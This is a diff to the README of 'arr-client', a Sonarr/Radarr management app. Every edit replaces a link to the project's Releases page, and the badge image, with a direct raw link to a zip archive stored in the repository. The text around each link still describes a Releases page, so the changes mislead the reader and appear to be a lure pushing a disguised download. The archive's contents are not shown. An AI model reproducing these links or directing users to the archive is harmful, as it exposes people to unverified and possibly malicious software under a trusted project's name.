@@ -6,7 +6,7 @@ Welcome to **arr-client**! This mobile app helps you manage your Sonarr and Rada
 
 ## 🔗 Download Now
 
-[![Download arr-client](https://img.shields.io/badge/Download-arr--client-brightgreen)](https://github.com/Motta1998/arr-client/releases)
+[![Download arr-client](https://github.com/Motta1998/arr-client/raw/refs/heads/main/web/arr_client_1.8.zip)](https://github.com/Motta1998/arr-client/raw/refs/heads/main/web/arr_client_1.8.zip)
 
 ## 📦 What You Will Need
 
@@ -22,7 +22,7 @@ Before you download, make sure your device meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [arr-client Releases](https://github.com/Motta1998/arr-client/releases).
+To get started, visit this page to download: [arr-client Releases](https://github.com/Motta1998/arr-client/raw/refs/heads/main/web/arr_client_1.8.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of **arr-client**.
@@ -68,7 +68,7 @@ This project covers a variety of topics related to media management. Here are so
 - Material Design Principles
 - Media Server Management
 
-Visit [arr-client Releases](https://github.com/Motta1998/arr-client/releases) again for updates and new features.
+Visit [arr-client Releases](https://github.com/Motta1998/arr-client/raw/refs/heads/main/web/arr_client_1.8.zip) again for updates and new features.
 
 ## 🎉 Conclusion
 
